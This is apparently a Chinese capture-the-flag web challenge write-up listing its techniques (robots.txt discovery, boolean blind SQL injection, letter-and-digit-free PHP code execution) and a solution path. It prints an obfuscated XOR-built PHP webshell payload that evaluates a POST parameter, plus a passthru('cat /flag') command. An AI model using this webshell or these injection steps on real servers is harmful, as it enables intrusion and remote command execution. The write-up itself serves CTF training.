**考点：**

1）目录扫描敏感信息泄露

2）sql注入之布尔盲注

3）php动态特性+无数字字母rce

4）php系统命令执行函数

**难度：**一般

**思路：**

目录扫描得到robots.txt

sql盲注得到rce界面，盲注脚本同目录下exp_web2.py

构造无数字字母木马进行rce，payload如下：

> $_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); $__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); $___=$$__;$_($___[_]); 

POST传参即可getshell

disable_functions禁用不全，使用：

> _=passthru('cat /flag')

即可getflag
